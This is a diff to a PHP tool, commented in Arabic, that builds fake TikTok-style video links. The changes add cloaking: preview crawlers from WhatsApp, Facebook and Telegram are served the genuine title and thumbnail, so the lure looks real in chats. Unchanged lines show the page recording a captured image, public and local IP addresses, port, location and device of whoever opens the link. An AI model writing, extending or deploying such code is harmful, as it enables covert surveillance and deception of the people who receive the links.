@@ -40,9 +40,10 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-function fetch_original_meta($url) {
+// دالة سحب العنوان والصورة المصغرة الحقيقية تلقائياً من أي رابط فيديو
+function fetch_real_meta_auto($url) {
     $meta = [
-        'title' => 'TikTok Video',
+        'title' => 'TikTok - Make Your Day',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
@@ -51,8 +52,8 @@ function fetch_original_meta($url) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.5 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1');
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1');
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     
@@ -64,14 +65,12 @@ function fetch_original_meta($url) {
         @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
         $xpath = new DOMXPath($dom);
 
-        // سحب العنوان الأصلي بدقة من وسوم OpenGraph أو Twitter أو Title العادية
         $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content | //title');
         if ($titleNodes->length > 0) {
             $val = trim($titleNodes->item(0)->nodeValue);
             if (!empty($val)) $meta['title'] = $val;
         }
 
-        // سحب الصورة المصغرة الأصلية بدقة
         $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content | //link[@rel="image_src"]/@href');
         if ($imageNodes->length > 0) {
             $val = trim($imageNodes->item(0)->nodeValue);
@@ -129,9 +128,28 @@ if (isset($_GET['r'])) {
         $target_redirect = $link['target_url'];
         $sender_name = $link['sender_name'];
         $sender_avatar = $link['sender_avatar'];
-        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $link['meta_image'];
         $meta_title = $link['meta_title'];
         $meta_image = $link['meta_image'];
+        $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $meta_image;
+
+        // التحقق مما إذا كان الطلب قادماً من روبوتات المعاينة (مثل واتساب أو فيسبوك)
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview/i', $ua);
+
+        // إذا كان روبوت معاينة، نعرض له فقط وسوم الـ OpenGraph الأصلية لكي تظهر المعاينة بدقة فوراً
+        if ($is_bot) {
+            header('Content-Type: text/html; charset=utf-8');
+            echo '<!DOCTYPE html><html><head>';
+            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<meta property="og:type" content="video.other">';
+            echo '<meta name="twitter:card" content="summary_large_image">';
+            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
+            echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
+            echo '<title>' . htmlspecialchars($meta_title) . '</title>';
+            echo '</head><body></body></html>';
+            exit();
+        }
 
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
             $img_base64 = $_POST['image'] ?? '';
@@ -139,7 +157,6 @@ if (isset($_GET['r'])) {
             $local_ip = $_POST['lip'] ?? 'Direct';
             $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
             $location = get_ip_location($public_ip);
-            $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
             $device = get_device_type($ua);
 
             if (!empty($img_base64)) {
@@ -157,13 +174,9 @@ if (isset($_GET['r'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($meta_title); ?></title>
-    <!-- وسوم المعاينة الأصلية المسحوبة تلقائياً -->
     <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <meta property="og:type" content="video.other">
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="<?php echo htmlspecialchars($meta_title); ?>">
-    <meta name="twitter:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
         body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
@@ -295,7 +308,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء رابط جديد (سحب تلقائي بالكامل)
+// إنشاء رابط جديد (سحب تلقائي كامل للعنوان والصورة الأصلية بدون إدخال يدوي)
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
@@ -305,10 +318,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    // سحب العنوان والصورة المصغرة الأصلية تلقائياً وبشكل كامل
-    $scraped_meta = fetch_original_meta($target_url);
-    $meta_title = $scraped_meta['title'];
-    $meta_image = $scraped_meta['image'];
+    // سحب البيانات تلقائياً من الرابط المستهدف
+    $scraped = fetch_real_meta_auto($target_url);
+    $meta_title = $scraped['title'];
+    $meta_image = $scraped['image'];
 
     // رفع صورة الحساب
     $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
@@ -321,7 +334,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
     }
 
-    // رفع صورة الخلفية (اختياري)
+    // رفع صورة الخلفية
     $bg_image_url = "";
     if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
